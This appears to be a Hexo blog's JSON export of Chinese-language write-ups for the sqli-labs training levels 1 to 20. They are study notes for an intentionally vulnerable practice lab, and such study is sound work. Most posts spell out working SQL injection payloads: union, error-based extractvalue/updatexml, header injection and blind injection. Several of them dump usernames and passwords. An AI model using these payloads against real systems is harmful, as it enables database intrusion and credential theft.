{"meta":{"title":"Hexo","subtitle":"","description":"","author":"FLYapple","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"sqli-labs-20","slug":"sqli-labs-20","date":"2022-04-01T08:38:34.000Z","updated":"2022-04-01T09:03:51.856Z","comments":true,"path":"2022/04/01/sqli-labs-20/","link":"","permalink":"http://example.com/2022/04/01/sqli-labs-20/","excerpt":"","text":"sqli-labs一、观察题目 输入admin，admin 发现信息比较丰富。，但是最下面的delete cookie令人在意，点击后返回原界面。结合题目，得知本题在cookie处进行注入。 二、尝试寻找注入点尝试在cookie最后加单引号，发现返回报错信息 尝试构造语句进行绕过 1Cookie: uname=admin&#x27; and 1=1# 成功。 三、提取数据同样，此题也不再赘述。以查询列名为例 1Cookie: uname=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))# 四、错误小结在点击delete cookie后发现提交包会找不到cookie，因此需要登录后才能对cookie进行注入。","categories":[],"tags":[]},{"title":"sqli-labs-19","slug":"sqli-labs-19","date":"2022-04-01T08:31:19.000Z","updated":"2022-04-01T09:03:58.076Z","comments":true,"path":"2022/04/01/sqli-labs-19/","link":"","permalink":"http://example.com/2022/04/01/sqli-labs-19/","excerpt":"","text":"sqli-labs-t19零、前置知识http请求头中Referer的含义和作用 - 步留痕 - 博客园 (cnblogs.com) 一、观察题目 输入admin，admin 提示Referer，结合题目，可以知道此题要在Referer中注入。 二、尝试寻找注入点使用burp抓包送入repeater 尝试在referer后加单引号 发现报错，尝试构造语句 1Referer: &#x27;,1)# 绕过成功。 三、提取数据尝试提取数据库名称 1Referer: &#x27;, extractvalue(1,concat(0x7e,database())))# 成功。 在此不再进行赘述。 四、错误小结无错误，构造思路与上题相同。","categories":[],"tags":[]},{"title":"sqli-labs-18","slug":"sqli-labs-18","date":"2022-04-01T02:47:28.000Z","updated":"2022-04-01T08:11:03.228Z","comments":true,"path":"2022/04/01/sqli-labs-18/","link":"","permalink":"http://example.com/2022/04/01/sqli-labs-18/","excerpt":"","text":"sqli-labs-18一、观察题目 尝试admin登录 提示我的user agent。结合标题，可以得出，是在http报文头中user agent属性进行注入。 二、尝试寻找注入点用burp抓包，发送至repeater，在user agent后添加单引号，查看返回报文 发现可以注入。但是不知道如何进行构造。上网搜索后发现两种注入方式 1User-Agent: &#x27; and updatexml(1,concat(0x7e,(select database())),1) and &#x27;1&#x27; =&#x27;1 此方法没有详细说明，因此不是很明白原理。 第二种查看了源码，但是讲解让我恍然大悟。后面的ip和用户名是需要构造进去的。 sqli-labs(18) - N0lan - 博客园 (cnblogs.com) 11&#x27;,1,1&#x27;)# 此外，经过测试，并不能识别–+注释，原因不明。（有可能上课听漏了抖抖抖） 三、查询数据知道了构造方法，接下来就和之前一样了。在此不再赘述。 1User-Agent:1&#x27;,1,extractvalue(1,(select group_concat(username,&#x27;:&#x27;,password,&#x27;,&#x27;) from users limit 0,1)))# 四、错误小结报错信息后面跟多少词条一般代表后面有多少参数，此时构造需要将那些参数构造在内。 最后还是没看懂第一个注入方式怎么构造的。","categories":[],"tags":[]},{"title":"sqli-labs-17","slug":"sqli-labs-17","date":"2022-03-31T13:34:57.000Z","updated":"2022-03-31T14:04:25.427Z","comments":true,"path":"2022/03/31/sqli-labs-17/","link":"","permalink":"http://example.com/2022/03/31/sqli-labs-17/","excerpt":"","text":"sqli-labs-t17零、前言由于时间问题，且前面几题重复度较高，在此不做演示。稍微特殊的为t17，以此作为代表 一、观察题目 题目有提示password reset 输入admin，admin 二、尝试寻找注入点在burp中抓包，尝试在uname后绕过，发现没有反应 既然题目多次引导password，就尝试在password后注入。 1passwd=admin&#x27; 发现有报错信息，因此可以构造绕过语句，进行信息提取 三、信息提取提取数据库名称 1passwd=admin&#x27; and extractvalue(1,concat(0x7e,(database())))--+ 提取数据库表名 1passwd=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+ 提取列名 1passwd=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))--+ 提取用户数据 1passwd=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password,&#x27;,&#x27;) from users limit 0,1)))--+&amp; 此时出现了别的错误，上网查询后可知，这是因为原网页使用了update语句对users表进行更改，因此需要一个中间表来进行过度。 尝试构建 1passwd=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password,&#x27;,&#x27;) from (select username,password from users limit 0,1)as a)))--+ 成功 四、错误小结本题中使用了update语句，对select语句进行了一些阻碍，而且使用了check_input()函数使username注入无效。","categories":[],"tags":[]},{"title":"sqli-labs-14","slug":"sqli-labs-14","date":"2022-03-31T12:19:09.000Z","updated":"2022-03-31T12:19:09.773Z","comments":true,"path":"2022/03/31/sqli-labs-14/","link":"","permalink":"http://example.com/2022/03/31/sqli-labs-14/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"sqli-labs-11","slug":"sqli-labs-11","date":"2022-03-31T09:56:04.000Z","updated":"2022-03-31T11:45:16.833Z","comments":true,"path":"2022/03/31/sqli-labs-11/","link":"","permalink":"http://example.com/2022/03/31/sqli-labs-11/","excerpt":"","text":"sqli-labs-t11一、观察题目本题目变成了post提交方式，因此需要burp进行抓包。 抓出来后可以在提交值中进行尝试寻找注入点。 二、尝试寻找注入点在repeater里对uname值进行修改，首先尝试单引号 1uname=admin&#x27; 发现包中返回了报错信息 可以构造语句进行注入 三、查询数据尝试查询数据库名 1uname=admin&#x27; and extractvalue(1,concat(0x7e,database()))--+ 尝试查询表名 1uname=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+ 尝试查询列名 1uname=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))--+ 查询用户名密码 1uname=admin&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password,&#x27;,&#x27;) from users limit 0,1 )))--+ 四、错误小结基本无问题，常规题。","categories":[],"tags":[]},{"title":"sqli-labs-7","slug":"sqli-labs-7","date":"2022-03-30T06:54:41.000Z","updated":"2022-03-31T09:47:35.104Z","comments":true,"path":"2022/03/30/sqli-labs-7/","link":"","permalink":"http://example.com/2022/03/30/sqli-labs-7/","excerpt":"","text":"sqli-labs-t7一、观察题目 题目显示要使用outfile（输出文件？外部文件？）暂时不了解。首先照例输入id&#x3D;1 可以看到，提示也是需要我们使用outfile。 二、尝试寻找注入点提交id&#x3D;1’后，发现报错信息改变了。 无法看到构造结构就无法进行绕过。因此采用时间盲注法（？）或者暴力破解法。 时间盲注由于自己的网络环境不太稳定，每次相同的提交如 1id=1 and if(length(database())=9,sleep(5),1) 会得到不同的反应时长 因此无法得出想要结果。 尝试暴力破解 依次尝试 123id=1&#x27; and 1=1 --+id=1&#x27;) and 1=1 --+id=1&#x27;)) and 1=1 --+ 发现最后一次可以正常显示 因此推测可以使用’))进行绕过。 三、提取数据由于报错信息被屏蔽，xml报错注入也无法显示，因此采用布尔盲注方法提取数据。 构造语句 1id=1&#x27;)) and substr(database(),1,1)=&#x27;a&#x27; --+ 使用burp抓包 发送到intruder准备进行爆破 在intruder中将子串位置、比较字符设置为变量，将攻击方式更改为clusterbomb 设置变量范围 进行爆破 为节省时间，对数据库、表名、列名的第一位进行手工注入验证。 database()&#x3D;security emails,referers,uagents,users id,username,password 四、错误总结本题虽然想到了盲注，但是对绕过仍然无头绪，由于网络状况也没能尝试出时间盲注能否不绕过直接得出结果。双括号绕过是在网上查阅资料时看到的，但是原文也是阅读源码才知道是双括号绕过。初步认为注入点判断步骤是根据单引号报错，之后自行添加括号进行尝试。","categories":[],"tags":[]},{"title":"sqli-labs-6","slug":"sqli-labs-6","date":"2022-03-30T06:27:54.000Z","updated":"2022-03-30T06:48:43.792Z","comments":true,"path":"2022/03/30/sqli-labs-6/","link":"","permalink":"http://example.com/2022/03/30/sqli-labs-6/","excerpt":"","text":"sqli-labs-t6一、观察题目 看到题目基本可以推断，是第四题的翻版。 尝试提交?id&#x3D;1 同样没有输出端口，因此使用报错注入构建输出端口 二、尝试寻找注入点由题目提示，尝试提交id&#x3D;1” 可以看出1后面有一个双引号，由此可构建绕过语句 提交 1id=1&quot; --+ 成功绕过 三、提取信息过程与上题相同，在此不过多赘述。在此提供其中查询列名的结果 提交 1id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))--+ 四、错误小结哎，没有错误~~","categories":[],"tags":[]},{"title":"sqli-labs-5","slug":"sqli-labs-5","date":"2022-03-30T02:47:54.000Z","updated":"2022-03-30T06:38:25.865Z","comments":true,"path":"2022/03/30/sqli-labs-5/","link":"","permalink":"http://example.com/2022/03/30/sqli-labs-5/","excerpt":"","text":"sqli-labs-t5一、观察题目 题目是双重注入，单引号。暂时不懂双重注入的意思，先提交?id&#x3D;1观察。 可以发现与前4题不同，它没有显示端口。这里第一反应是报错注入构成一个显示端。 大致思路有了，进行注入点的寻找 二、尝试寻找注入点提交id&#x3D;1’ 从错误信息中可以看出1后有一个单引号，因此可以构造绕过指令 1id=1&#x27; --+ 成功绕过 三、提取数据因为没有前四题一样的显示端，所以需要进行报错注入。可选floor注入、xml注入，在此我选择extractvalue函数进行注入。 首先尝试输出数据库名 提交 1id=1&#x27; and extractvalue(1,concat(0x7e,database())) --+ 尝试输出数据库内表名 提交 1id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+ 尝试获取users表属性名称 提交 1id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e)) --+ 查询用户信息 提交 1id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password,&#x27;;&#x27;) from users limit 0,1),0x7e)) --+ 注：1.extractvalue()第二个参数需要一个不符合路径要求的特殊符号来导致报错，因此常常在第二个参数后使用concat(0x7e)进行拼接 2.xpath报错有32位字符数量限制，因此常使用limit对长度进行控制 四、错误小结中间对concat()和select的位置产生了迷惑，而且忽略了select要用括号包裹起来（为什么），浪费了不少时间。 此外，双重注入实际上为floor注入（？）","categories":[],"tags":[]},{"title":"sqli-labs-4","slug":"sqli-labs-4","date":"2022-03-30T01:11:50.000Z","updated":"2022-03-30T03:23:34.298Z","comments":true,"path":"2022/03/30/sqli-labs-4/","link":"","permalink":"http://example.com/2022/03/30/sqli-labs-4/","excerpt":"","text":"sqli-labs-t4一、观察题目 题目显示和双引号有关，提示仍与前3题一样，那么尝试提交id&#x3D;1 可以推测和前三题的思路相似，尝试进行绕过 二、尝试寻找注入点既然题目说为双引号，那么尝试提交 1?id=1” 可以发现报错信息中1的前方有双引号，后方除了提交的双引号还有一个双引号和一个括号 由此可以尝试构造绕过语句 提交 1?id=1&quot;) --+ 发现输出内容，绕过成功 三、提取数据库信息据上次练题已经过将近一周，再次重温一下information_schema库中的表的信息MySQL 中的 information_schema 数据库_kikajack的博客-CSDN博客_information_schema 尝试查当前数据库 1?id=1&quot;) and 1=2 union select 1,2,database()--+ 尝试查询数据库内表名 提交 1id=1&quot;) and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 尝试查询users表 提交 1id=1&quot;) and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+ 查询内容 提交 1id=1&quot;) and 1=2 union select 1,2,group_concat(username,&#x27;,&#x27;,password,&#x27;:&#x27;) from users--+ 完成 四、错误小结在本题中我出现了一个错误，即在查询表名时错误的提交成了 1id=1&quot;) and 1=2 union select 1,2,group_concat(select table_name from information_schema.tables where table_schema=database())--+ 这里的select很容易绕晕，当时的理解是select只当输出一个常数，group_concat可以当作一个常数输出，但实际上group_concat并不能当作常数，它只是一个把外层select在该项（括号内的属性名）的查询结果拼接成字符串的函数，不是把括号里语句的结果拼接成字符串的函数。 以上。","categories":[],"tags":[]},{"title":"sqli-labs_3","slug":"sqli-labs-3","date":"2022-03-23T10:41:21.000Z","updated":"2022-03-24T02:03:43.465Z","comments":true,"path":"2022/03/23/sqli-labs-3/","link":"","permalink":"http://example.com/2022/03/23/sqli-labs-3/","excerpt":"","text":"sqli-labs-t3注：在进行题解之前，建议前往sqli-labs第一关分析-百度经验 (baidu.com)学习前两关的绕过原理并尝试自行解题。 一、观察题目同t1，t2一样的提示，尝试提交id&#x3D;[num]，一切正常 二、寻找注入点尝试使用单引号，发现进行了报错 根据报错信息可知，这里有字符型注入点，并且在id&#x3D;1之后有一个括号。 尝试对括号进行绕过 提交 12id=1&#x27;) and 1=1 --+id=1&#x27;) and 1=2 --+ 同t1、t2，尝试输出数据库名称验证绕过成功 提交 1id=1&#x27;) and 1=2 union select 1,2,database() --+ 绕过成功 三、信息提取同t1，t2，在此不做过多赘述","categories":[],"tags":[]},{"title":"sqli-labs_2","slug":"sqli-labs-2","date":"2022-03-23T08:59:38.000Z","updated":"2022-03-24T02:00:09.710Z","comments":true,"path":"2022/03/23/sqli-labs-2/","link":"","permalink":"http://example.com/2022/03/23/sqli-labs-2/","excerpt":"","text":"sql-labs-t2注：同t1思路完全相同，仅注入点不同。可以不看此题解 一、观察题目同t1的提示，提交id&#x3D;1进行尝试 同t1思路，尝试寻找注入点 二、寻找注入点提交 1id=1&#x27; and 1=1 --+ 发现提示信息有and 1&#x3D;1 – ，因此尝试推测为整形注入点 进行尝试，提交 12id=1 and 1=1 --+id=1 and 1=2 --+ 发现存在注入点 三、查找表的结构同t1，先对表单属性个数进行测试 提交 1id=1 order by [num]--+ 同样到4时进行报错，推测有三个元素 对输出进行测试 提交 1id=-1 union select 1,2,3--+ 得出输出样式，同样是2，3位置可以输出。 获取数据库信息 提交 1id=-1 union select 1,group_concat(database()),3--+ 可知此数据库为security 之后在information_schema表中查找数据库表信息 提交 1id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+ 找到数据库表名信息 根据表名查询表内属性 提交 1id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ 获得属性名称 对信息查询 提交 1id=-1 union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+","categories":[],"tags":[]},{"title":"sqli-labs_1","slug":"sqli-labs-1","date":"2022-03-22T11:40:06.000Z","updated":"2022-03-24T02:20:40.004Z","comments":true,"path":"2022/03/22/sqli-labs-1/","link":"","permalink":"http://example.com/2022/03/22/sqli-labs-1/","excerpt":"","text":"sqli-labs-t1union联合注入方法一、观察题目 提示写了“Please input the ID as parameter with numeric value”，因此尝试使用GET方法上传id数值，首先尝试id&#x3D;1，结果如下 之后尝试id&#x3D;2，3，4 二、尝试寻找注入点尝试使用id&#x3D;1 and 1&#x3D;1 # 和 id&#x3D;1 and 1&#x3D;2 # 判断是否有整形注入点 发现编译正常，无整型注入点 尝试使用id&#x3D;1’ and 1&#x3D;1 # 和 id&#x3D;1’ and 1&#x3D;2# 判断是否有字符型注入点 发现出现报错信息，根据报错可知为MySQL数据库，且存在字符型注入点。 注：–+和#均为注释符，可以进行末尾注释，但#在url中作为锚点（？） 不能当作数据进行传输，因此会出现报错，不能正常执行。可以使用url编码替换（%23） 注2：本题可以用单引号进行”注释“ 参考：SQL注入注释符(#、– 、&#x2F;**&#x2F;)使用条件及其他注释方式的探索 - impulse- - 博客园 三、查找表的结构信息首先测试该数据库的元素个数，使用order by [数字] 进行测试 提交 1id=1&#x27; order by [数字] 1，2，3都正常，当为4时报错，说明网页所调用表仅有3个属性 之后进行输出测试，查看网页输出对应属性 提交 1id=-1&#x27; union select 1,2,3 --+ 由此可以看出，此页面查询可返回三个结果，其中只显示属性2，3。大致推测是索引、用户名、密码。 知道如何输出有用信息后，查询数据库名 提交 1id=-1&#x27; union select 1,database(),3 --+ 可知数据库名为security 接下来利用information_schema表对所有结构进行查询。 注：关于information_schema表的主要内容参考MySQL 中的 information_schema 数据库_kikajack的博客-CSDN博客_information_schema 从schemata表中可查询所有数据库名称 提交 1id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+ 查询目标security数据库中table信息 首先查询表名 提交 1id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+ 需要寻找的用户信息应当在user表中，因此通过columns表对users表结构进行查询 提交 1id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+ 得知该表属性名称即可开始查询用户名和密码 提交 1id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+ 完成提取 报错注入xml报错关于extractvalue()和updatexml()的详细解释在学习基于extractvalue()和updatexml()的报错注入_A1ienX的博客-CSDN博客_updatexml中可以学习。 extractvalue(str1,str2)是查询xml元素的函数，其中str1是一个目标xml标签，str2是xml文档路径。当路径标签不合规范时会报错并显示其中内容。（对其中为什么能够执行sql语句暂不理解） updatexml(str1,str2,str3)是更新xml标签函数，str1和str2同上，str3为更新内容。报错方式同上。 具体查询步骤与union相同此处不再一一赘述。此处以extractvalue演示最终结果。 floor报错floor报错的相关知识可以在Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com)进行学习 但未能实现例句。原因目前不明。","categories":[],"tags":[]}],"categories":[],"tags":[]}